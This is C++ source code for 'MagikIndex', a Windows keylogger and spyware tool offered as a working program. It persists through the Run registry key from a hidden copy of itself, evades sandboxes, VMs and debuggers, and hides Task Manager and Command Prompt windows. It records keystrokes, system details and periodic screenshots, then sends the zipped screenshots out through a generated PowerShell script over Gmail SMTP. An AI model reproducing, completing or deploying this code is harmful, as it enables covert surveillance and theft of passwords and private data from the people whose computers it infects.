#include "common.h"
#include "logo.h"

//#include "lz4/lz4.h"
//#include <Wbemidl.h>
//#include <wbemcli.h>


#pragma warning( push )
#pragma warning( disable : 4477 )

typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");


HHOOK keyboardHook;

int main()
{


    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    DWORD Tick1 = GetTickCount();

    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();

    srand(RandSeed);

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {
        RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
        exit(0);
    }
#ifndef debug

    unsigned long ThreadId;
    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);


#endif

    if (DelayExecution) {
        int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
        LARGE_INTEGER delay;
        delay.QuadPart = -10000 * (DividedSleep * 1000);
        pNtDelayExecution(FALSE, &delay);
        for (int j = 0; j <= Divider; j++) {
            Sleep(DividedSleep);
        }
    }

    bool FirstLog = true;

    unsigned long ThreadId2;
    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);

    //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);

    AntiDBG DebugItem;
    DebugItem.Initialize();
    TrustItems Trust = DebugItem.TrustItem;
    bool TrustTooLow = false;
    if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
        if (QuitIfUntrust) {
            FinalExit();
        }
        TrustTooLow = true;                                         
    }
    //add special security routines, example:
    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
    // or
    // if( classic sandbox parameters ){ act like a normal program to evade detection }

Log:

    Log log;
    log.CreateLog();

    DWORD Tick = GetTickCount();

    std::string VersionText = "MagikIndex ";
    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string AspectRatioText = "Aspect Ratio:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";
    std::string CPUBrand = "CPU Brand And Model:";
    std::string GenuineText = "Genuine Windows:";
    std::string SlowText = "Low-End CPU:";
    std::string MouseText = "Number Of Mouse Buttons:";
    std::string MonitorText = "Number Of Monitors:";
    std::string LanguageText = "Install Language:";
    std::string CurrencyText = "Install Currency:";
    std::string MiddleEastText = "Middle-East PC:";
    std::string BootText = "Normal Boot:";
    std::string RAMText = "RAM Size:";
    std::string SeedText = "Randomness Seed:";
    std::string CopiedFileText = "Made executable \"";
    std::string CryptText = "Encrypted with \"";

    std::string NormalizedVersion = std::to_string(CurrentVersion);
    for (int i = 0; i < 4; i++) {
        if (i == 3 && NormalizedVersion[3] == '0')
            break;
        VersionText += NormalizedVersion[i];
    }
    if (IsMajor)
        VersionText += " Major Release - ";
    else
        VersionText += " Minor/Dev Release - ";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    std::string LogTime = std::to_string(Tick);

    SYSTEMTIME SysTime;
    char TimeBuffer[512];
    ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
    GetLocalTime(&SysTime);

    std::string StartDate = "_________" + VersionText;
    StartDate += std::to_string(SysTime.wDay);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wMonth);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wYear);
    StartDate += "  ";
    StartDate += std::to_string(SysTime.wHour);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wMinute);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wSecond);
    StartDate += "_________\n";

    log.LogItChar(MyLogo);
    log.LogItChar("\n");
    log.LogItChar(StartDate);

#ifdef debug

    log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
    log.LogItChar("Not crypting the logs...");

#else

    log.LogItChar("Started in normal mode...");
    CryptText += "Secure Random Key Shift...";
    log.LogItChar(CryptText);

#endif

    if (FirstLog) {
        if (Trust.IsResCheck)
            log.LogItChar("Resolution ratio mismatch, trust decreased...");
        if (Trust.IsInVM)
            log.LogItChar("VM Guest specific files found, trust decreased...");
        if (Trust.IsHostingAVM)
            log.LogItChar("VM Host specific files found, trust increased...");
        if (Trust.IsSmallHardDrive)
            log.LogItChar("HardDrive is under the set minimum, trust decreased...");
        if (Trust.IsSmallRAM)
            log.LogItChar("RAM is under the set minimum, trust decreased...");
        if (Trust.IsBeingDebugged)
            log.LogItChar("Process is being debugged, trust decreased...");
        if (Trust.HasOneCore)
            log.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
        if (Trust.HasMultipleMonitors)
            log.LogItChar("Multiple monitor setup found, trust increased...");
        if (Trust.HasBeenTimepatched)
            log.LogItChar("Process has been timepatched, trust decreased...");
        if (Trust.UserIsInactive)
            log.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
        if (Trust.HasActiveInternet)
            log.LogItChar("Active internet connection found, trust increased...");
        if (Trust.Proxied)
            log.LogItChar("Proxy/Fake connection found, trust decreased...");
        if (Trust.HasRunningAntiMalware)
            log.LogItChar("Running Anti-Malware solution found, trust increased...");
        if (Trust.HasMoreThan20Apps)
            log.LogItChar("More than 20 apps installed, trust increased...");
        if (Trust.ExtUserActivity)
            log.LogItChar("No user input in the past 15s, trust decreased...");
    }

    if (TrustTooLow) {
        log.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
        log.LogItChar("Trust factor too low, quitting...");
        log.SendLog();
        FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
    }

    DWORD Size = MAX_LENGTH+1;

    char HostName[MAX_LENGTH+1];

    char UserName[MAX_LENGTH+1];

    std::string InternetStatusString = "Not connected, error: ";

    DWORD DWFlags;

    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {    //switch between these two ways to check as you see fit, or even use both
    if (InternetGetConnectedState(&DWFlags,NULL)){
        InternetStatusString = "Connected";
    }else{
        InternetStatusString += std::to_string(GetLastError());
        InternetStatusString += ", returned flags: ";
        InternetStatusString += std::to_string(DWFlags);
    }

    GetComputerNameA(HostName,&Size);

    GetUserNameA(UserName,&Size);

    if (FirstLog) {

        log.LogItChar("First log of the session, copying files and adding to startup...");

        std::string DestinationFile = "C:\\Users\\";
        DestinationFile += UserName;
        DestinationFile += "\\Music\\MagikIndex";


        CreateDirectoryA(DestinationFile.c_str(), NULL);

        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

        if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
            std::string Command = "/C del /f /q ";
            Command += DestinationFile;
            Command += "\\*.*";
            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
            log.LogItChar("Cleaned MagikIndex folder...");
            Sleep(200);
        }
        DestinationFile += "\\";

        std::string CopiedFile;

        char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
        for (int i = 0; i < 15; i++) {
            CopiedFile += CharacterSet[rand() % 61 + 0];
        }

        DestinationFile += CopiedFile;

        DestinationFile += ".exe";

        CopyFileA(PathToFile, DestinationFile.c_str(), false);

        CopiedFileText += CopiedFile;
        CopiedFileText += ".exe\"...";
        log.LogItChar(CopiedFileText);

        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");

        log.LogItChar("Registered executable for startup...");

    }else{
        log.LogItChar("Not the first log of the session, skip copying files...");
    }

    int x1, y1, x2, y2, w, h, mo, mb;
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    mo = GetSystemMetrics(SM_CMONITORS);
    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
    w = x2 - x1;
    h = y2 - y1;
    double Ratioed = (double)w / h;
    std::string Width = std::to_string(w);
    std::string Height = std::to_string(h);
    std::string WindowsVersion = "Unknown";
    std::string Monitors = std::to_string(mo);
    std::string MouseButtons = std::to_string(mb);
    std::string BootMode = "Yes";

    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
        BootMode = "No";
    }
    std::string SlowMachine = "No";
    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
        SlowMachine = "Yes";
    }
    std::string MiddleEast = "No";
    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
        MiddleEast = "Yes";
    }
    if (IsWindowsXPOrGreater()) {
        WindowsVersion = "XP / Vista";
    }
    if (IsWindows7OrGreater())
    {
        WindowsVersion = "Seven";
    }
    if (IsWindows7SP1OrGreater())
    {
        WindowsVersion = "Seven SP1";
    }
    if (IsWindows8OrGreater())
    {
        WindowsVersion = "Eight";
    }
    if (IsWindows8Point1OrGreater())
    {
        WindowsVersion = "Eight.one";
    }
    if (IsWindows10OrGreater())
    {
        WindowsVersion = "Ten";
    }
    if (IsWindowsServer())
    {
        WindowsVersion = "Server";
    }

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);
    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
    
    std::string IsGenuine = "Yes";
    CONST SLID AppId = WINDOWS_SLID;
    SL_GENUINE_STATE GenuineState;
    HRESULT hResult;

    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);

    if (hResult == S_OK) {
        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
            IsGenuine = "No";
        }
    }

    char Locale[LOCALE_NAME_MAX_LENGTH+1];

    GetCurrencyFormatA(
        LOCALE_SYSTEM_DEFAULT, 
        LOCALE_NOUSEROVERRIDE,
        "0",
        NULL,
        Locale,
        LOCALE_NAME_MAX_LENGTH);

    TimeText += LogTime;
    log.LogItChar(TimeText);

    ComputerText += HostName;
    log.LogItChar(ComputerText);

    UsernameText += UserName;
    log.LogItChar(UsernameText);

    InternetText += InternetStatusString;
    log.LogItChar(InternetText);

    WidthText += Width;
    log.LogItChar(WidthText);

    HeightText += Height;
    log.LogItChar(HeightText);

    AspectRatioText += std::to_string(Ratioed);
    log.LogItChar(AspectRatioText);

    WindowsText += WindowsVersion;
    log.LogItChar(WindowsText);

    OEMText += OEMNumber;
    log.LogItChar(OEMText);

    RAMText += RAMAmount;
    RAMText += " MB";
    log.LogItChar(RAMText);

    CPUNumberText += CPUCores;
    log.LogItChar(CPUNumberText);

    CPUTypeText += CPUType;
    log.LogItChar(CPUTypeText);

    CPUBrand += GetCpuInfo();
    log.LogItChar(CPUBrand);

    GenuineText += IsGenuine;
    log.LogItChar(GenuineText);

    MouseText += MouseButtons;
    log.LogItChar(MouseText);

    MonitorText += Monitors;
    log.LogItChar(MonitorText);

    BootText += BootMode;
    log.LogItChar(BootText);

    SlowText += SlowMachine;
    log.LogItChar(SlowText);

    LanguageText += GetSystemDefaultUILanguage();
    log.LogItChar(LanguageText);

    CurrencyText += Locale;
    log.LogItChar(CurrencyText);

    MiddleEastText += MiddleEast;
    log.LogItChar(MiddleEastText);

    SeedText += std::to_string(RandSeed);
    log.LogItChar(SeedText);


    log.LogItChar("_____________________________________________\n");





    int ArraySize = 10;

     int KeyList = {};


     for (int k = 0; k < CharactersPerLog;) {
         Sleep(25);
         for (int i = 8; i < 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 log.LogItInt(i);
                 k++;
             }
         }
     }
     /*
     std::string RemoteFile = "Log";
     RemoteFile += LogTime;
     RemoteFile += ".txt";
     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
     */

     log.LogItChar("\n_____________________________________________");
     log.LogItChar("Character limit hit, sending log...");

     log.SendLog();
     FirstLog = false;

     goto Log;
     return 0;
}

int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
{
    int len = (int)strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
    char* tempdir = (char*)malloc(len);
    memset(tempdir, 0, len);
    strcpy(tempdir, dir);

    SHFILEOPSTRUCTA file_op = {
      NULL,
      FO_DELETE,
      tempdir,
      NULL,
      FOF_NOCONFIRMATION |
      FOF_NOERRORUI |
      FOF_SILENT,
      false,
      0,
      "" };
    int ret = SHFileOperationA(&file_op);
    free(tempdir);
    return ret; // returns 0 on success, non zero on failure.
}


void TakeScreenShot(const char* filename) {
    int x1, y1, x2, y2, w, h;

    // get screen dimensions
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

    SaveHBITMAPToFile(hBitmap, filename);
    //CLEAN
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
};

BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
{
    std::string base64;
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
        * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }


    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

    if (hOldPal2)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }

      fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
    
    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    /*
        base64.append("<img src=\"data:image/jpeg;base64,");
        base64.append((LPSTR)&bmfHdr);
        base64.append((LPSTR)&lpbi);
        cout<< base64;
    */
     WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);

        WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
    
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    CloseHandle(fh);
    return TRUE;
}



ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer

    char* AppData = nullptr;
    DWORD Size = MAX_LENGTH + 1;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string CurrentLog;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
    std::string ScreenshotDir = AppData;
    ScreenshotDir += "\\MagikGlass";
    DWORD DWFlags;

    while (1) {
        SilentlyRemoveDirectory(ScreenshotDir.c_str());
        Sleep(60000);
        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
        for (int i = 0; i < ScreenshotsPerZip; i++) {
            CurrentLog = ScreenshotDir;
            CurrentLog += "\\ScreenShot";
            CurrentLog += std::to_string(rand() % 10000 - 1000);
            CurrentLog += ".png";

            TakeScreenShot(CurrentLog.c_str());

            Sleep(SecondsBetweenScreenshots*1000);
        }
        std::string ZipPath = ScreenshotDir;
        ZipPath += "\\Zip";
        ZipPath += std::to_string(rand() % 10000 - 1000);
        ZipPath += ".zip";

        FILE* f = fopen(ZipPath.c_str(), "wb");
        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
        fclose(f);

        const char* files[] = {
            ScreenshotDir.c_str()
        };

        {
            CoInitialize(NULL);
            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
            CoUninitialize();
        }

        if (!InternetGetConnectedState(&DWFlags, NULL)) {
            //SetUploadTask(Emailer, ZipPath);
        }
        else {
            std::string Command = "/C powershell ";
            char SysDir[MAX_PATH];
            GetSystemDirectoryA(SysDir, MAX_PATH);
            DWORD WrittenBytes, DWFlags;
            char* AppData = nullptr;
            size_t AppDataSize;
            strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
            _dupenv_s(&AppData, &AppDataSize, "APPDATA");
            std::string Powershell = AppData;
            Powershell += "\\MagikGlass\\PSScript";
            Powershell += std::to_string(GetTickCount());
            Powershell += ".PS1";
            std::string PSStartup = "MagikMailer";
            PSStartup += std::to_string(GetTickCount());
            HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
            a += SendersEmail;
            a += "', '";
            a += SendersPsw;
            a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
            a += SendersEmail;
            a += "'\n$ReportEmail.To.Add('";
            a += RecieversEmail;
            a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
            a += ZipPath.c_str();
            a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
            WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
            CloseHandle(PS1File);
            Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
            Command += Powershell;
            Command += "\"";
            if (!InternetGetConnectedState(&DWFlags, NULL)) {
                RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
            }
            else {
                ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
            }
        }

        Sleep(140000);

    }
}

int CalculateDirSize(std::string DirectoryToCheck) {

    HANDLE hFind;
    WIN32_FIND_DATAA data;

    DirectoryToCheck += "\\*.*";

    int FileCounter = 0;

    //char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }

    return FileCounter;
}


BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

ULONG WINAPI Protect(LPVOID Parameter) {

    if (IsDebuggerPresent()) {
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
    return 0;
}

std::string GetCpuInfo()
{
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();
    std::array<char, 64> charBuffer = {};
    constexpr std::array<int, 3> functionIds = {
        0x8000'0002,
        0x8000'0003,
        0x8000'0004
    };
    std::string cpu;
    for (int id : functionIds)
    {
        __cpuid(integerBuffer.data(), id);
        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
        cpu += std::string(charBuffer.data());
    }
    return cpu;
}

bool fexists(std::string filename) {
    DWORD dwAttrib = GetFileAttributes(filename.c_str());

    if(dwAttrib != INVALID_FILE_ATTRIBUTES)
        return true;
}

void FinalExit() {
    char PathToSelf[MAX_PATH];
    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
    Command += PathToSelf;
    Command += "\"";
    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
    exit(0);
}



#pragma warning( pop )